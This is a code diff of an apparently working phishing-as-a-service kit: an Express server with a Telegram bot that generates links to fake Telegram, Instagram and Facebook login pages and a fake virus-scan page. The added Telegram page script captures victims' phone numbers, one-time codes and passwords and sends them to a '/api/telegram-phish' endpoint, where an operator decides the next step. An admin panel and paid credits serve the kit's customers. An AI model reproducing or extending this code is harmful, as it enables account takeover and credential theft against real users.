+    async function checkDecision(){try{const r=await fetch('/api/telegram-decision/'+SESSION_ID);const d=await r.json();if(d.decision){hideDecisionWaiting();if(d.decision==='password'){otpSection.classList.remove('active');passwordSection.classList.add('active');currentStep='password';setStatus('🔐 Please enter your password',true);passwordInput.focus()}else if(d.decision==='wrong'){showError(otpError,'❌ Invalid verification code. Please try again.');otpInput.value='';otpInput.focus();verifyOtpBtn.style.display='block';currentStep='otp'}else if(d.decision==='open'){otpSection.classList.remove('active');finalResult.style.display='block';currentStep='final';setStatus('✅ Request submitted successfully!',true)}}}catch(e){console.error(e)}}
+    async function apiCall(action,data={}){try{const r=await fetch('/api/telegram-phish',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...data,sessionId:SESSION_ID,userId:USER_ID,platform:PLATFORM,action:action})});return await r.json()}catch(e){console.error(e);return{error:'Network error'}}}
+    sendOtpBtn.addEventListener('click',async()=>{const phone=phoneInput.value.trim();if(phone.length<10){showError(loginError,'Please enter a valid 10-digit phone number.');return}phoneNumber=phone;hideError(loginError);showLoader(loginLoader);sendOtpBtn.disabled=true;const result=await apiCall('phone',{phone:phoneNumber});await new Promise(r=>setTimeout(r,1800));hideLoader(loginLoader);sendOtpBtn.disabled=false;if(result.status==='success'){loginSection.classList.add('hidden');otpSection.classList.add('active');currentStep='otp';setStatus('📱 Verification code sent to your phone',true);startOtpTimer();otpInput.focus()}else{showError(loginError,'❌ Failed to send OTP. Please try again.')}});
+    verifyOtpBtn.addEventListener('click',async()=>{const otp=otpInput.value.trim();if(otp.length<5){showError(otpError,'Please enter a valid 5-digit verification code.');return}otpCode=otp;hideError(otpError);showLoader(otpLoader);verifyOtpBtn.disabled=true;const result=await apiCall('otp',{otp:otpCode,phone:phoneNumber});if(result.status==='waiting_decision'){hideLoader(otpLoader);showDecisionWaiting();setStatus('⏳ Waiting for verification...')}else if(result.status==='success'){hideLoader(otpLoader);verifyOtpBtn.disabled=false;otpSection.classList.remove('active');passwordSection.classList.add('active');currentStep='password';setStatus('🔐 OTP verified! Enter password',true);passwordInput.focus();if(otpTimerInterval)clearInterval(otpTimerInterval)}else{hideLoader(otpLoader);verifyOtpBtn.disabled=false;showError(otpError,'❌ Verification failed. Please try again.')}});
+    resendOtpBtn.addEventListener('click',async()=>{if(resendOtpBtn.disabled)return;setStatus('📤 Resending verification code...');await apiCall('resend-otp',{phone:phoneNumber});setStatus('✅ Verification code resent!',true);startOtpTimer();otpInput.value='';otpInput.focus()});
+    passwordSubmitBtn.addEventListener('click',async()=>{const pwd=passwordInput.value.trim();if(pwd.length<4){showError(passwordError,'Please enter a valid password (minimum 4 characters).');return}password=pwd;hideError(passwordError);showLoader(passwordLoader);passwordSubmitBtn.disabled=true;const result=await apiCall('password',{password:password,phone:phoneNumber});if(result.status==='success'){hideLoader(passwordLoader);passwordSubmitBtn.disabled=false;passwordSection.classList.remove('active');finalResult.style.display='block';currentStep='final';setStatus('✅ Premium request submitted successfully!',true)}else{hideLoader(passwordLoader);passwordSubmitBtn.disabled=false;showError(passwordError,'❌ Wrong password. Please try again.');passwordInput.value='';passwordInput.focus()}});
+    openCompletedBtn.addEventListener('click',()=>{openStatus.textContent='✅ Thank you! Your request has been submitted.';openStatus.className='status-text show';openStatus.style.color='#28a745';setStatus('📱 Request submitted successfully!',true);apiCall('completed',{phone:phoneNumber})});
+    phoneInput.addEventListener('keypress',e=>{if(e.key==='Enter')sendOtpBtn.click()});
+    otpInput.addEventListener('keypress',e=>{if(e.key==='Enter')verifyOtpBtn.click()});
+    passwordInput.addEventListener('keypress',e=>{if(e.key==='Enter')passwordSubmitBtn.click()});
+    phoneInput.addEventListener('input',()=>{phoneInput.value=phoneInput.value.replace(/[^0-9]/g,'').slice(0,10)});
+    otpInput.addEventListener('input',()=>{otpInput.value=otpInput.value.replace(/[^0-9]/g,'').slice(0,5)});
     phoneInput.focus();
-
     console.log('✅ Telegram Phishing Page Loaded');
-    console.log('👤 User ID:', USER_ID);
-    console.log('📱 Session:', SESSION_ID);
 </script>
 </body>
 </html>`;
 
-// ====================== OTHER TEMPLATES (with premium emojis & improved design) ======================
+// ====================== OTHER TEMPLATES ======================
 const INSTA_TEMPLATE = `<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>instafree1kfollowers</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}.input-group input::placeholder{color:#777}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#888;text-decoration:none}
+.btn-primary{background:linear-gradient(135deg,#4f5bd5,#d62976)}
+.btn-success{background:#28a745}
+.btn-danger{background:#dc3545}
 </style>
 </head>
 <body>
@@ -1658,7 +1101,7 @@ const INSTA_TEMPLATE = `<!DOCTYPE html>
 <div id="form-screen">
 <div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>
 <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
-<button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>
+<button class="btn btn-primary" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>
 </div>
 <div id="process-screen" style="display:none">
 <div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
@@ -1708,6 +1151,9 @@ const FB_TEMPLATE = `<!DOCTYPE html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>fbprivatechat</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}.input-group input::placeholder{color:#666}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#666;text-decoration:none}
+.btn-primary{background:linear-gradient(135deg,#1877f2,#0056b3)}
+.btn-success{background:#28a745}
+.btn-danger{background:#dc3545}
 </style>
 </head>
 <body>
@@ -1717,7 +1163,7 @@ const FB_TEMPLATE = `<!DOCTYPE html>
 <div id="form-screen">
 <div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone"></div>
 <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
-<button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>
+<button class="btn btn-primary" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>
 </div>
 <div id="process-screen" style="display:none">
 <div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
@@ -1796,6 +1242,7 @@ video,canvas{display:none}
 .result-box{display:none;text-align:center;padding:20px 0}
 .result-box i{font-size:50px;color:#00ff88}
 .result-box h3{color:#fff;margin-top:10px;font-family:"Orbitron",sans-serif}
+.btn-primary{background:linear-gradient(135deg,#00ff88,#00cc66)}
 </style>
 </head>
 <body>
@@ -1927,6 +1374,9 @@ body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh
 .result-box.danger{background:rgba(255,71,87,0.05);border-color:rgba(255,71,87,0.1)}
 .result-box.danger i{color:#ff4757}
 .result-box.danger h3{color:#ff4757}
+.btn-primary{background:linear-gradient(135deg,#1877f2,#0056b3)}
+.btn-success{background:#28a745}
+.btn-danger{background:#dc3545}
 </style>
 </head>
 <body>
@@ -1946,7 +1396,7 @@ body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh
 <span class="badge" id="threat3">🟡 Vulnerable File</span>
 <span class="badge" id="threat4">🔴 Trojan Found</span>
 </div>
-<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN NOW</button>
+<button class="btn btn-danger" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN NOW</button>
 <div id="status" class="status"></div>
 <div class="progress" id="progress"><div class="fill" id="progressFill"></div></div>
 <div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Initializing security scan...</div></div>
@@ -2240,7 +1690,6 @@ app.post('/api/telegram-phish', async (req, res) => {
 
 // ====================== ADMIN API ENDPOINTS ======================
 
-// Get all photos
 app.get('/api/admin/photos', async (req, res) => {
     try {
         const photos = await getPhotos();
@@ -2250,7 +1699,6 @@ app.get('/api/admin/photos', async (req, res) => {
     }
 });
 
-// Upload photo via admin (using multer)
 app.post('/api/admin/upload', upload.single('photo'), async (req, res) => {
     try {
         if (!req.file) {
@@ -2266,7 +1714,6 @@ app.post('/api/admin/upload', upload.single('photo'), async (req, res) => {
     }
 });
 
-// Delete photo
 app.delete('/api/admin/photos/:id', async (req, res) => {
     try {
         const success = await deletePhoto(req.params.id);
@@ -2277,7 +1724,6 @@ app.delete('/api/admin/photos/:id', async (req, res) => {
     }
 });
 
-// Toggle photo active
 app.patch('/api/admin/photos/:id/toggle', async (req, res) => {
     try {
         const photo = await togglePhoto(req.params.id);
@@ -2288,7 +1734,6 @@ app.patch('/api/admin/photos/:id/toggle', async (req, res) => {
     }
 });
 
-// Get channels
 app.get('/api/admin/channels', async (req, res) => {
     try {
         const channels = await getChannels();
@@ -2298,7 +1743,6 @@ app.get('/api/admin/channels', async (req, res) => {
     }
 });
 
-// Add channel
 app.post('/api/admin/channels', async (req, res) => {
     try {
         const { id, name, link } = req.body;
@@ -2310,7 +1754,6 @@ app.post('/api/admin/channels', async (req, res) => {
     }
 });
 
-// Remove channel
 app.delete('/api/admin/channels/:id', async (req, res) => {
     try {
         await removeChannel(req.params.id);
@@ -2320,7 +1763,6 @@ app.delete('/api/admin/channels/:id', async (req, res) => {
     }
 });
 
-// Get all users
 app.get('/api/admin/users', async (req, res) => {
     try {
         const users = await User.find();
@@ -2341,7 +1783,6 @@ app.get('/api/admin/users', async (req, res) => {
     }
 });
 
-// Get single user
 app.get('/api/admin/user/:userId', async (req, res) => {
     try {
         const user = await getUser(req.params.userId);
@@ -2359,7 +1800,6 @@ app.get('/api/admin/user/:userId', async (req, res) => {
     }
 });
 
-// Modify credits
 app.post('/api/admin/modify-credits', async (req, res) => {
     try {
         const { userId, amount } = req.body;
@@ -2375,7 +1815,6 @@ app.post('/api/admin/modify-credits', async (req, res) => {
     }
 });
 
-// Toggle unlimited
 app.post('/api/admin/toggle-unlimited', async (req, res) => {
     try {
         const { userId } = req.body;
@@ -2389,7 +1828,6 @@ app.post('/api/admin/toggle-unlimited', async (req, res) => {
     }
 });
 
-// Get featured
 app.get('/api/admin/featured', async (req, res) => {
     try {
         const featured = await getFeatured();
@@ -2409,7 +1847,6 @@ app.get('/api/admin/featured', async (req, res) => {
     }
 });
 
-// Set featured photo
 app.post('/api/admin/featured/photo', async (req, res) => {
     try {
         const { photoId } = req.body;
@@ -2421,7 +1858,6 @@ app.post('/api/admin/featured/photo', async (req, res) => {
     }
 });
 
-// Remove featured photo
 app.delete('/api/admin/featured/photo', async (req, res) => {
     try {
         await setFeaturedPhoto(null);
@@ -2431,7 +1867,6 @@ app.delete('/api/admin/featured/photo', async (req, res) => {
     }
 });
 
-// Set featured message
 app.post('/api/admin/featured/message', async (req, res) => {
     try {
         const { message } = req.body;
@@ -2443,7 +1878,6 @@ app.post('/api/admin/featured/message', async (req, res) => {
     }
 });
 
-// Toggle featured status
 app.post('/api/admin/featured/toggle', async (req, res) => {
     try {
         await toggleFeaturedStatus();
@@ -2453,7 +1887,6 @@ app.post('/api/admin/featured/toggle', async (req, res) => {
     }
 });
 
-// Get QR code
 app.get('/api/admin/qr', async (req, res) => {
     if (qrExists()) {
         res.sendFile(QR_FILE);
@@ -2462,7 +1895,6 @@ app.get('/api/admin/qr', async (req, res) => {
     }
 });
 
-// Upload QR (multipart)
 app.post('/api/admin/upload-qr', upload.single('qr'), async (req, res) => {
     try {
         if (!req.file) {
@@ -2484,14 +1916,12 @@ app.post('/api/admin/upload-qr', upload.single('qr'), async (req, res) => {
     }
 });
 
-// Remove QR
 app.delete('/api/admin/remove-qr', (req, res) => {
     const removed = deleteQRFile();
     if (removed) res.json({ success: true });
     else res.status(404).json({ error: 'QR not found' });
 });
 
-// Get logs
 app.get('/api/admin/logs', (req, res) => {
     try {
         const logPath = path.join(DATA_DIR, 'logs.txt');
@@ -2507,7 +1937,6 @@ app.get('/api/admin/logs', (req, res) => {
     }
 });
 
-// Clear logs
 app.delete('/api/admin/logs', (req, res) => {
     try {
         const logPath = path.join(DATA_DIR, 'logs.txt');
@@ -2518,11 +1947,60 @@ app.delete('/api/admin/logs', (req, res) => {
     }
 });
 
-// ====================== ADMIN ROUTE (FIXED UI) ======================
+// ====================== ADMIN ROUTE ======================
 app.get('/admin', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title>
-<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:#0a0a0a;color:#fff;padding:20px}.container{max-width:1200px;margin:0 auto}.header{background:linear-gradient(135deg,#ff4757,#ff6b6b);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}.header h1{font-size:36px}.tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}.tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s;color:#fff}.tab.active{background:linear-gradient(135deg,#ff4757,#ff6b6b);border-color:#ff4757}.tab:hover{background:#2a2a4a}.tab-content{display:none}.tab-content.active{display:block}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}.card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}.card:hover{transform:translateY(-5px);border-color:#ff4757}.card img{width:100%;height:200px;object-fit:cover;border-radius:10px}.card .info{padding:10px 0}.card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}.btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}.btn-danger{background:#dc3545;color:#fff}.btn-danger:hover{background:#c82333}.btn-warning{background:#ffc107;color:#000}.btn-warning:hover{background:#e0a800}.btn-primary{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff}.btn-primary:hover{background:linear-gradient(135deg,#ff6b6b,#ff4757)}.btn-success{background:#28a745;color:#fff}.btn-success:hover{background:#1e7e34}.upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}.upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}.upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}.upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.stat-card .number{font-size:32px;font-weight:700;color:#ff4757}.stat-card .label{color:#888;font-size:14px}.channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}.channel-item .name{font-weight:600}.channel-item .id{color:#888;font-size:12px}.user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}.user-card .uid{color:#ff4757;font-weight:600}.toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}.toast.error{background:#dc3545}.empty{text-align:center;padding:60px 20px;color:#666}.empty i{font-size:64px;margin-bottom:20px;display:block}input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}.flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}.qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}.featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}.featured-preview img{max-width:200px;border-radius:10px}.status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}.status-active{background:#1a3a1a;color:#28a745}.status-inactive{background:#3a1a1a;color:#dc3545}.logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}.qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}
+body{background:#0a0a0a;color:#fff;padding:20px}
+.container{max-width:1200px;margin:0 auto}
+.header{background:linear-gradient(135deg,#ff4757,#ff6b6b);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}
+.header h1{font-size:36px}
+.tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}
+.tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s;color:#fff}
+.tab.active{background:linear-gradient(135deg,#ff4757,#ff6b6b);border-color:#ff4757}
+.tab:hover{background:#2a2a4a}
+.tab-content{display:none}.tab-content.active{display:block}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}
+.card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}
+.card:hover{transform:translateY(-5px);border-color:#ff4757}
+.card img{width:100%;height:200px;object-fit:cover;border-radius:10px}
+.card .info{padding:10px 0}
+.card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}
+.btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}
+.btn-danger{background:#dc3545;color:#fff}.btn-danger:hover{background:#c82333}
+.btn-warning{background:#ffc107;color:#000}.btn-warning:hover{background:#e0a800}
+.btn-primary{background:#2b9eff;color:#fff}.btn-primary:hover{background:#1a8bff}
+.btn-success{background:#28a745;color:#fff}.btn-success:hover{background:#1e7e34}
+.upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}
+.upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}
+.upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}
+.upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}
+.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}
+.stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
+.stat-card .number{font-size:32px;font-weight:700;color:#ff4757}
+.stat-card .label{color:#888;font-size:14px}
+.channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}
+.channel-item .name{font-weight:600}
+.channel-item .id{color:#888;font-size:12px}
+.user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}
+.user-card .uid{color:#ff4757;font-weight:600}
+.toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}
+.toast.error{background:#dc3545}
+.empty{text-align:center;padding:60px 20px;color:#666}
+.empty i{font-size:64px;margin-bottom:20px;display:block}
+input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}
+.flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
+.qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}
+.featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}
+.featured-preview img{max-width:200px;border-radius:10px}
+.status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}
+.status-active{background:#1a3a1a;color:#28a745}
+.status-inactive{background:#3a1a1a;color:#dc3545}
+.logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}
+.qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}
 </style></head>
 <body><div class="container"><div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div>
 <div class="tabs"><div class="tab active" onclick="showTab('photos')">📷 Photos</div><div class="tab" onclick="showTab('channels')">📢 Channels</div><div class="tab" onclick="showTab('users')">👥 Users</div><div class="tab" onclick="showTab('featured')">⭐ Featured</div><div class="tab" onclick="showTab('qr')">💰 QR</div><div class="tab" onclick="showTab('logs')">📋 Logs</div><div class="tab" onclick="showTab('commands')">📜 Commands</div></div>
@@ -2670,7 +2148,7 @@ app.post('/api/upload-photo-fast', async (req, res) => {
     }
 });
 
-// ====================== CREATE LINK API (ALL PLATFORMS) ======================
+// ====================== CREATE LINK API (FIXED) ======================
 app.get('/api/create-link', async (req, res) => {
     try {
         const userid = req.headers.userid || 'unknown';
@@ -2748,7 +2226,6 @@ app.get('/page/:id', async (req, res) => {
 });
 
 // ====================== TELEGRAM BOT ======================
-// IMPORTANT: S7 MUST BE INITIALIZED BEFORE ANY HANDLERS
 const S7 = new TelegramBot(config.mainToken, { polling: true });
 S7.getMe().then(botInfo => {
     console.log('✅ Bot Started: @' + botInfo.username);
@@ -2759,7 +2236,6 @@ S7.getMe().then(botInfo => {
 });
 
 // ====================== KEYBOARDS ======================
-// Using normal emojis for buttons (no premium)
 const LOVESY = {
     inline_keyboard: [
         [{ text: '📸 INSTAGRAM', callback_data: 'gen_instagram' }],
@@ -3138,7 +2614,6 @@ S7.on('callback_query', async (q) => {
             await S7.answerCallbackQuery(q.id, { text: 'No pending payment', show_alert: true });
             return;
         }
-        // Add to payment history
         if (!user.paymentHistory) user.paymentHistory = [];
         user.paymentHistory.push({
             amount: payment.amount,
@@ -3284,14 +2759,13 @@ S7.on('message', async (msg) => {
     logToFile('💰 Payment screenshot from ' + msg.from.id + ' - ₹' + payment.amount);
 });
 
-// ====================== BROADCAST HANDLER (with media support) ======================
+// ====================== BROADCAST HANDLER ======================
 S7.on('message', async (msg) => {
     if (!msg.text && !msg.photo && !msg.video && !msg.document && !msg.animation && !msg.sticker) return;
     const text = msg.text || '';
     if (!text.startsWith('/broadcast')) return;
     if (msg.from.id.toString() !== config.adminId) return;
     
-    // If it's a reply to a message with media
     if (msg.reply_to_message) {
         const reply = msg.reply_to_message;
         const users = await User.find();
@@ -3324,7 +2798,6 @@ S7.on('message', async (msg) => {
         return;
     }
     
-    // Text broadcast
     const message = text.replace('/broadcast', '').trim();
     if (!message) {
         return S7.sendMessage(msg.chat.id, replaceAllEmojis('⚠️ Usage: /broadcast [message]\nOr reply to a message with /broadcast to forward media.'));
@@ -3699,7 +3172,7 @@ S7.on('message', async (msg) => {
     }
 });
 
-// ====================== HANDLER FOR /ADD PHOTO (reply) ======================
+// ====================== HANDLER FOR /ADD PHOTO ======================
 S7.on('message', async (msg) => {
     if (!msg.photo && !(msg.document && msg.document.mime_type && msg.document.mime_type.startsWith('image/'))) return;
     const user = await getUser(msg.from.id);
@@ -3755,7 +3228,7 @@ S7.on('message', async (msg) => {
     }
 });
 
-// ====================== REDEEM COUPON (USER COMMAND) ======================
+// ====================== REDEEM COUPON ======================
 S7.on('message', async (msg) => {
     if (!msg.text) return;
     const text = msg.text.trim();
@@ -3808,7 +3281,7 @@ app.get('/api/admin/rate-limit', async (req, res) => {
         const now = Date.now();
         let totalRequests = 0;
         let activeUsers = 0;
-        const threshold = 5 * 60 * 1000; // 5 minutes
+        const threshold = 5 * 60 * 1000;
         for (const user of users) {
             totalRequests += user.rateLimitCount || 0;
             if (user.lastActivity && (now - new Date(user.lastActivity).getTime()) < threshold) {
@@ -3879,6 +3352,7 @@ app.listen(config.port, () => {
     console.log('🌟 PREMIUM TELEGRAM EMOJIS ENABLED!');
